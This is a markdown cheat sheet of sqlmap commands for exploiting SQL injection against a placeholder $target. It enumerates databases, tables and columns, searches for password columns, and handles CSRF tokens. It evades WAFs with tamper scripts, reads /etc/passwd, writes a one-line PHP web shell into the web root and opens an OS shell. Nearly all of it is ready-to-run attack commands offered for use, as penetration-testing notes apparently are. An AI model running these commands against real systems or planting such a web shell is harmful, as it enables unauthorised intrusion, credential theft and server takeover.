# Basic

```sh
sqlmap -u “http://$target/index.php” --batch
```

> Tips: `sqlmap` have flags that are like `curl`, so you can use your browser -> `F12` -> Network -> right click on a request -> copy value -> copy as cURL. Then replace `curl` with `sqlmap`

| Flag              | Example                             |
| ----------------- | ----------------------------------- |
| `--flush-session` |                                     |
| `--proxy`         | `--proxy="socks4://127.0.0.1:8080"` |
| `--skip-waf`      |                                     |
| `--random-agent`  |                                     |

# Control

## Request file as input

`post.req` in the command is text file of a whole post request

```sh
sqlmap -r post.req --risk 3 --level 3 --force-ssl --batch
```

## Mark vulnerable parameter

If we know the exact vulnerable parameter, we can use `*` as a marker of where to test

```sh
# GET request
sqlmap -u 'http://$target/index.php?id=1*' --batch
# POST request
sqlmap -u 'http://$target/index.php' -d 'id=1*' --batch
# JSON (api) request
sqlmap -u 'http://$target/index.php' -d '{"id": 1*}' --batch
# Header
sqlmap -u 'http://$target/index.php' -H 'Cookie: id=1*' --batch
```

Or, we can just specify using `-p` option

```sh
sqlmap -u 'http://$target/index.php?id=1' -p id --batch
```

## DBMS

If we know what backend dbms is, we can specify it to save time

```sh
sqlmap -u 'http://$target/index.php?id=1' --dbms mysql --batch
```

## Technique

If we know what type of injection is possible, we can specify it to save time

`BEUSTQ`: Boolean, Error, Union, Stacked, Time, Inline queries

```sh
sqlmap -u 'http://$target/index.php?id=1' --technique U --batch
```

## Enumerate

> Useful for time-based sqli, we only dump what is strictly necessary

### Databases

```sh
sqlmap -u “http://$target/index.php” --current-database --batch
```

```sh
sqlmap -u “http://$target/index.php” -dbs --batch
```

### Tables

```sh
sqlmap -u “http://$target/index.php” -D <database> --tables --batch
```
### Columns

```sh
sqlmap -u “http://$target/index.php” -D <database> -T <table> --collums --batch
```

### Search

Easiest way, we can bypass all other enumerations and perhaps save some time.

Can search dbs, tables, columns with `-D`, `-T`, `-C`

```sh
sqlmap -u “http://$target/index.php” -C 'passw' --search
```

# CSRF

## Auto retrieve token

```sh
sqlmap -u "http://$target/index.php" --data "id=1&csrf-token=<token>" --csrf-url "http://$target/index.php" --csrf-token "csrf-token" --batch
```

## Unique value

```sh
sqlmap -u "http://$target/index.php?id=1&csrf-token=29125" --randomize=csrf-token --batch
```

## Calculated value

In this case, csrf token is md5 hash of the `id` GET parameter

```sh
sqlmap -u "http://$target/index.php?id=1*&h=c4ca4238a0b923820dcc509a6f75849b" --eval "import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

# WAF bypass

Sometimes, waf blocks requests that has '<' or '>' in them. To bypass this, we use `--tamper` flag. 

`between` is the tamper script that replace '>' with `NOT BETWEEN 0 AND #`, and the '=' with `BETWEEN # AND #`

```sh
sqlmap -u "http://$target/index.php?id=1*" --tamper between --batch
```

# OS exploit

Check privilege. Not exactly required, but more and more modern DB restricts your ability to interact with OS if you are not DBA

```sh
sqlmap -u "http://$target/index.php?id=1*" --is-dba --batch
```

## File read

```sh
sqlmap -u "http://$target/?id=1*" --file-read "/etc/passwd" --batch
```

## File write

```sh
# Create a file
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Write the file to target
sqlmap -u "http://$target/?id=1*" --file-write "shell.php" --file-dest "/var/www/html/shell.php" --batch
```

## Code execution

```sh
sqlmap -u "http://$target/?id=1*" --os-shell --batch
```

# Some tamper scripts (infodump)

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |
